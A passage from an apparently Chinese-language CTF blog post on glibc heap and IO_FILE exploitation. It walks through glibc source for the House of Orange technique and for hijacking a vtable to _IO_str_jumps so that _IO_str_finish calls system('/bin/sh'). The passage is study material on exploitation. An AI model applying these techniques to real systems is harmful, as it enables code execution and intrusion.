&#123;</span><br><span class="line">    brk = (<span class="type">char</span> *) (MORECORE (size));</span><br><span class="line">    LIBC_PROBE (memory_sbrk_more, <span class="number">2</span>, brk, size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (brk != (<span class="type">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Call the `morecore&#x27; hook if necessary.  */</span></span><br><span class="line">    <span class="type">void</span> (*hook) (<span class="type">void</span>) = atomic_forced_read (__after_morecore_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">      (*hook)();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>此时堆的状态如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/58f74b778e8fa04af4ca279b2a02a1d6.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ><br>如果是正常通过 brk 系统调用扩展 heap 区域，最终程序将直接增大 top chunk 的 size，但是由于之前已经将 top chunk 的 size 改小了，通不过下面的 if 判断。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="type">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">  set_head (old_top, (size + old_size) | PREV_INUSE);</span><br></pre></td></tr></table></figure></div>

<p>并且会通过接下来的检查：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Oops!  Someone else killed our space..  Can&#x27;t touch anything.  */</span></span><br><span class="line">    malloc_printerr (<span class="number">3</span>, <span class="string">&quot;break adjusted to free malloc space&quot;</span>, brk,</span><br><span class="line">av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>此时 ptmalloc 认为 heap 段已经不连续，ptmalloc 会为新的 heap 段的 top chunk 通过 brk 扩展 heap 区域，然后释放掉原先的 top chunk 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">           Otherwise, make adjustments:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         * If the first time through or noncontiguous, we need to call sbrk</span></span><br><span class="line"><span class="comment">            just to find out where the end of memory lies.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         * We need to ensure that all returned chunks from malloc will meet</span></span><br><span class="line"><span class="comment">            MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         * If there was an intervening foreign sbrk, we need to adjust sbrk</span></span><br><span class="line"><span class="comment">            request size to account for fact that we will not be able to</span></span><br><span class="line"><span class="comment">            combine new space with existing space in old_top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         * Almost all systems internally allocate whole pages at a time, in</span></span><br><span class="line"><span class="comment">            which case we might as well use the whole last page of request.</span></span><br><span class="line"><span class="comment">            So we allocate enough more memory to hit a page boundary now,</span></span><br><span class="line"><span class="comment">            which in turn causes future contiguous calls to page-align.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    front_misalign = <span class="number">0</span>;</span><br><span class="line">    end_misalign = <span class="number">0</span>;</span><br><span class="line">    correction = <span class="number">0</span>;</span><br><span class="line">    aligned_brk = brk;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handle contiguous cases */</span></span><br><span class="line">    <span class="keyword">if</span> (contiguous(av)) &#123;</span><br><span class="line">        <span class="comment">/* Count foreign sbrk as system_mem.  */</span></span><br><span class="line">        <span class="keyword">if</span> (old_size)</span><br><span class="line">            av-&gt;system_mem += brk - old_end;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Guarantee alignment of first new chunk made from this space */</span></span><br><span class="line"></span><br><span class="line">        front_misalign = (INTERNAL_SIZE_T) chunk2mem(brk) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">        <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">               Skip over some bytes to arrive at an aligned position.</span></span><br><span class="line"><span class="comment">               We don&#x27;t need to specially mark these wasted front bytes.</span></span><br><span class="line"><span class="comment">               They will never be accessed anyway because</span></span><br><span class="line"><span class="comment">               prev_inuse of av-&gt;top (and any chunk created from its start)</span></span><br><span class="line"><span class="comment">               is always true after initialization.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line">            correction = MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">            aligned_brk += correction;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           If this isn&#x27;t adjacent to existing space, then we will not</span></span><br><span class="line"><span class="comment">           be able to merge with old_top space, so must add to 2nd request.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        correction += old_size;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Extend the end address to hit a page boundary */</span></span><br><span class="line">        end_misalign = (INTERNAL_SIZE_T) (brk + size + correction);</span><br><span class="line">        correction += (ALIGN_UP(end_misalign, pagesize)) - end_misalign;</span><br><span class="line"></span><br><span class="line">        assert(correction &gt;= <span class="number">0</span>);</span><br><span class="line">        snd_brk = (<span class="type">char</span> *) (MORECORE(correction));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           If can&#x27;t allocate correction, try to at least find out current</span></span><br><span class="line"><span class="comment">           brk.  It might be enough to proceed without failing.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           Note that if second sbrk did NOT fail, we assume that space</span></span><br><span class="line"><span class="comment">           is contiguous with first sbrk. This is a safe assumption unless</span></span><br><span class="line"><span class="comment">           program is multithreaded but doesn&#x27;t use locks and a foreign sbrk</span></span><br><span class="line"><span class="comment">           occurred between our first and second calls.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (snd_brk == (<span class="type">char</span> *) (MORECORE_FAILURE)) &#123;</span><br><span class="line">            correction = <span class="number">0</span>;</span><br><span class="line">            snd_brk = (<span class="type">char</span> *) (MORECORE(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* Call the `morecore&#x27; hook if necessary.  */</span></span><br><span class="line">            <span class="type">void</span> (*hook)(<span class="type">void</span>) = atomic_forced_read(__after_morecore_hook);</span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">                (*hook)();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* handle non-contiguous cases */</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">            <span class="comment">/* MORECORE/mmap must correctly align */</span></span><br><span class="line">            assert(((<span class="type">unsigned</span> <span class="type">long</span>) chunk2mem(brk) &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            front_misalign = (INTERNAL_SIZE_T) chunk2mem(brk) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">            <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                   Skip over some bytes to arrive at an aligned position.</span></span><br><span class="line"><span class="comment">                   We don&#x27;t need to specially mark these wasted front bytes.</span></span><br><span class="line"><span class="comment">                   They will never be accessed anyway because</span></span><br><span class="line"><span class="comment">                   prev_inuse of av-&gt;top (and any chunk created from its start)</span></span><br><span class="line"><span class="comment">                   is always true after initialization.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line"></span><br><span class="line">                aligned_brk += MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Find out current end of memory */</span></span><br><span class="line">        <span class="keyword">if</span> (snd_brk == (<span class="type">char</span> *) (MORECORE_FAILURE)) &#123;</span><br><span class="line">            snd_brk = (<span class="type">char</span> *) (MORECORE(<span class="number">0</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Adjust top based on results of second sbrk */</span></span><br><span class="line">    <span class="keyword">if</span> (snd_brk != (<span class="type">char</span> *) (MORECORE_FAILURE)) &#123;</span><br><span class="line">        av-&gt;top = (mchunkptr) aligned_brk;</span><br><span class="line">        set_head(av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);</span><br><span class="line">        av-&gt;system_mem += correction;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           If not the first time through, we either have a</span></span><br><span class="line"><span class="comment">           gap due to foreign sbrk or a non-contiguous region.  Insert a</span></span><br><span class="line"><span class="comment">           double fencepost at old_top to prevent consolidation with space</span></span><br><span class="line"><span class="comment">           we don&#x27;t own. These fenceposts are artificial chunks that are</span></span><br><span class="line"><span class="comment">           marked as inuse and are in any case too small to use.  We need</span></span><br><span class="line"><span class="comment">           two to make sizes and alignments work out.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (old_size != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">               Shrink old_top to insert fenceposts, keeping size a</span></span><br><span class="line"><span class="comment">               multiple of MALLOC_ALIGNMENT. We know there is at least</span></span><br><span class="line"><span class="comment">               enough space in old_top to do this.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            old_size = (old_size - <span class="number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">            set_head(old_top, old_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">               Note that the following assignments completely overwrite</span></span><br><span class="line"><span class="comment">               old_top when old_size was previously MINSIZE.  This is</span></span><br><span class="line"><span class="comment">               intentional. We need the fencepost, even if old_top otherwise gets</span></span><br><span class="line"><span class="comment">               lost.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            chunk_at_offset(old_top, old_size)-&gt;size =</span><br><span class="line">                    (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">            chunk_at_offset(old_top, old_size + <span class="number">2</span> * SIZE_SZ)-&gt;size =</span><br><span class="line">                    (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* If possible, release the rest. */</span></span><br><span class="line">            <span class="keyword">if</span> (old_size &gt;= MINSIZE) &#123;</span><br><span class="line">                _int_free(av, old_top, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0de93e6d5f6cdddac9cd0ff131017791.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
之后是第二部分。首先修改 unsorted chunk 的 size 为 0x61，并且 bk 字段 指向 `_IO_list_all - 0x10` ，同时在 chunk 中伪造 IO_FILE 结构体。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/76ec828172cf2b1303c4a64259731550.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                >
之后申请一个大小不等于 0x60 的 chunk 。

<p>程序首先会在 unsorted bin 中寻找合适的 chunk 。由于 bk 已被修改，不满足 <code>bck == unsorted_chunks (av)</code> ，因此不会从该 chunk 中切下合适的 chunk 然后返回。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">  &#123;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line">    ...</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">        bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">        victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">        (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br></pre></td></tr></table></figure></div>

<p>之后将该 chunk 从 unsorted bin 中取出，从而完成一次 unsorted bin attack 。由于已经保证申请的 chunk 大小与该 chunk 大小不同，因此不会直接将该 chunk 返回，而是直接放到 small bin 中。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">  &#123;</span><br><span class="line">  	...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></div>

<p>最终效果如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f1893892a22542008b7e191d2609727c.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                ><br>之后程序进入 unsorted bin 的第二次循环，由于此时 victim 为 <code>_IO_list_all - 0x10</code>，因此不会通过对 <code>victim-&gt;size</code> 的检查，从而进入 <code>malloc_printerr</code> 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">  &#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">        || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                       chunk2mem (victim), av);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p> 最终，程序会遍历 <code>_IO_list_all</code> 对应的 IO_FILE 链表，并且如果 IO_FILE 结构体满足 <code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> 会调用对应 vtable 中的 <code>_IO_overflow</code> 函数，从而获得 shell 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">malloc_printerr</span> <span class="params">(<span class="type">int</span> action, <span class="type">const</span> <span class="type">char</span> *str, <span class="type">void</span> *ptr, mstate ar_ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>,</span><br><span class="line">                      __libc_argv[<span class="number">0</span>] ? : <span class="string">&quot;&lt;unknown&gt;&quot;</span>, str, cp);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Abort with an error message.  */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__libc_message (<span class="type">int</span> do_abort, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (do_abort)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="built_in">abort</span> ();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fflush(s) _IO_flush_all_lockp (0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Cause an abnormal program termination with core-dump.  */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">abort</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/* Flush all streams.  We cannot close them now because the user</span></span><br><span class="line"><span class="comment">     might have registered a handler for SIGABRT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (stage == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ++stage;</span><br><span class="line">      fflush (<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	  result = EOF;</span><br><span class="line">      ...</span><br><span class="line">      fp = fp-&gt;_chain;</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>自 glibc-2.27 开始，abort 函数发生较大改动，不再调用 <code>_IO_flush_all_lockp</code> 函数，因此不能利用 malloc_printerr 实现程序执行流劫持。</p>
<h2 id="劫持-vtable-到-IO-str-jumps"><a href="#劫持-vtable-到-IO-str-jumps" class="headerlink" title="劫持 vtable 到 _IO_str_jumps"></a>劫持 vtable 到 _IO_str_jumps</h2><p>以这道<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/VN2020CTF_easyTHEAP" >题目<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>为例，libc2.24 在 <code>IO_validate_vtable</code> 函数中对 <code>*vtable</code> 指针进行校验，<code>vtable</code> 必须要满足 在 <code>__stop___IO_vtables</code> 和 <code>__start___libc_IO_vtables</code> 之间，而我们伪造的 <code>vtable</code> 通常不满足这个条件。<br>但是 <code>_IO_str_jumps</code> 与 <code>__IO_wstr_jumps</code> 就位于 <code>__stop___libc_IO_vtables</code> 和 <code>__start___libc_IO_vtables</code> 之间，所以我们是可以利用他们来通过 <code>IO_validate_vtable</code> 的检测的,只需要将 <code>*vtable</code> 填成 <code>_IO_str_jumps</code> 或 <code>__IO_wstr_jumps</code> 地址即可。<br><code>_IO_str_jumps</code> 同样是 <code>_IO_jump_t</code> 类型，但是与与原来的 <code>vtable</code> 指向的 <code>__GI__IO_file_jumps</code> 相比指向的函数不同。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/c7d9dd92c1701cea6ee1e0efca16f645.png"
                     
                ><br><code>_IO_str_jumps</code> 其中的 <code>_IO_str_finish</code> 直到 libc-2.27 版本都是下面这种实现手段。也就是说，如果修改 <code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code> 为 <code>system</code> 地址，然后修改 <code>fp-&gt;_IO_buf_base</code> 为 <code>/bin/sh</code> 字符串地址，然后触发程序执行 <code>_IO_str_finish</code> 函数就可以得到 shell 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

